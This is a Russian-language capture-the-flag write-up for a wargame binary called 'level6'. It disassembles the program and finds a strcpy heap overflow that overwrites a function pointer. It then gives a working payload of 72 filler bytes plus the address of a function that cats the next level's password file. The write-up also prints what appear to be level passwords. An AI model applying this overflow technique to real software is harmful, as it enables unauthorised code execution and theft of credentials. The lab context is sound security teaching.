## HowTo
```
su level6
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

### Инструменты:
- Ida Pro + hex rays
- peda (gdb + patterns)
- ltrace


### Анализ и ход решения

Запуск с любым аргументом дает `Nope`
```
> ./level6 aaa
Nope
```

Используем Ida Pro, получаем си-псевдокод. Ищем, что именно печатает эту строку, находим функцию `m`. 
Также находим функцию `n`, которая делает ровно то, что нам нужно - `return system("/bin/cat /home/user/level7/.pass");`
Наша задача - вызвать `n` вместо `m`

```
> disass main
   0x0804847c <+0>:	push   %ebp
   0x0804847d <+1>:	mov    %esp,%ebp
   0x0804847f <+3>:	and    $0xfffffff0,%esp
   0x08048482 <+6>:	sub    $0x20,%esp
   0x08048485 <+9>:	movl   $0x40,(%esp)
   0x0804848c <+16>:	call   0x8048350 <malloc@plt>
   0x08048491 <+21>:	mov    %eax,0x1c(%esp)
   0x08048495 <+25>:	movl   $0x4,(%esp)
   0x0804849c <+32>:	call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:	mov    %eax,0x18(%esp)
   0x080484a5 <+41>:	mov    $0x8048468,%edx
   0x080484aa <+46>:	mov    0x18(%esp),%eax
   0x080484ae <+50>:	mov    %edx,(%eax)
   0x080484b0 <+52>:	mov    0xc(%ebp),%eax
   0x080484b3 <+55>:	add    $0x4,%eax
   0x080484b6 <+58>:	mov    (%eax),%eax
   0x080484b8 <+60>:	mov    %eax,%edx
   0x080484ba <+62>:	mov    0x1c(%esp),%eax
   0x080484be <+66>:	mov    %edx,0x4(%esp)
   0x080484c2 <+70>:	mov    %eax,(%esp)
   0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:	mov    0x18(%esp),%eax
   0x080484ce <+82>:	mov    (%eax),%eax
   0x080484d0 <+84>:	call   *%eax
   0x080484d2 <+86>:	leave  
   0x080484d3 <+87>:	ret  
```

В конце исполнения вызывается нечто, хранящееся в `eax`. Это нечто - указатель, которых хранится в `eax`. 
В начале происходит выделение `4 байт`, туда кладется указатель. Затем выделяется еще `64 байта`. 
Указатель из обаслти `4 байт` копируется в область `64 байта`, после чего происходит вызов фунции по указателю.

### Решение
1. Находим адреса, которые выдают оба маллока
```
ltrace ./level6
malloc(64) = 0x0804a008
malloc(4)= 0x0804a050
```

2. Находим адрес интересующей нас функции `n`
```
> gdb ./level6
> info address n
Symbol "n" is at 0x8048454 in a file compiled without debugging.
```

Либо
```
> x n
0x8048454 <n>:	0x83e58955
```

3. Ищем оффсеты и адреса
- Путем экспериментов, находим, что нужным нам оффсет - это разница указателей маллоков
`0x0804a050 - 0x0804a008 = 72`
- адрес `n` нам известен - `0x8048454`. Дополняем и приводим к `little = \x54\x84\x04\x08`

4. Пробуем запуск с payload
**NB:** запуск вида `python -c "print 'a' * 72 + '\x54\x84\x04\x08'" - / level6` не работает. 
Гипотеза в том, что причина - в ожидании агрумента на вход. 

```
./level6 $(python -c "print 'a' * 72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```